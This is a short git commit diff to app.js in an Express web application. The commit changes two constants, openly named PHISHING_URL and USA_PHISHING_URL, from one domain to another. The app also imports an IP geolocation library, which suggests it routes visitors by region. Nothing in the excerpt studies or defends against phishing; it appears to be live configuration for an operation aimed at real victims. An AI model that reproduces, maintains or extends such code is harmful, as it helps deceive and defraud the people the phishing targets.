cae01c7de3b1c0f59c3a8580c4d258f64fe4f3d7
iamgodwinide <iamgodwinide@gmail.com>
2025-07-24 18:09:16 +0100

    new

--- app.js
+++ app.js
@@ -8,8 +8,8 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
-const PHISHING_URL = "extrememodels.co";
-const USA_PHISHING_URL = "extrememodels.co";
+const PHISHING_URL = "starmodelspro.cfd";
+const USA_PHISHING_URL = "starmodelspro.cfd";
 
 
 // CONFIGS
